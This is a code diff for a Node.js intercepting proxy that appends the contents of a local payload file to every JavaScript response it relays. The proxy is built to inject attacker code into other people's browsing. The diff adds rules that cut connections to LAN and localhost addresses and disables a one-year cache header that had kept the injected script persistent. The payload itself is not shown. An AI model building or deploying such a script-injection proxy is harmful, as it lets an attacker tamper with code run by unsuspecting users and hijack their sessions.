@@ -9,6 +9,11 @@ require('http').createServer(API_onRequest).listen(8181);
 // js to be injected into others js
 var payload = require("fs").readFileSync("./pl.js");
 
+/* prevent connections to internal LAN */
+proxy.tamper(/192\.168/, breakConnection);
+proxy.tamper(/127\.0/, breakConnection);
+proxy.tamper(/localhost/, breakConnection);
+
  /* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     WEB PROXY SETTINGS
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
@@ -18,7 +23,7 @@ proxy.tamper(/\.js/, function(request){
         console.log("code injected: " + payload);
         response.body += payload;
         response.headers['content-length'] = response.body.length;
-        response.headers["Cache-Control"] = "max-age=31536000"; // 1 year
+        //response.headers["Cache-Control"] = "max-age=31536000"; // 1 year
         response.complete();
     });
 });
@@ -47,4 +52,10 @@ function notFound(response)
 {
     response.writeHead(200,{"content-type" : "text/html"});
     response.end("<h2>Not found</h2>");
+}
+
+function breakConnection(request)
+{
+    request.url = "****";
+    request.headers["host"] = "****";
 }
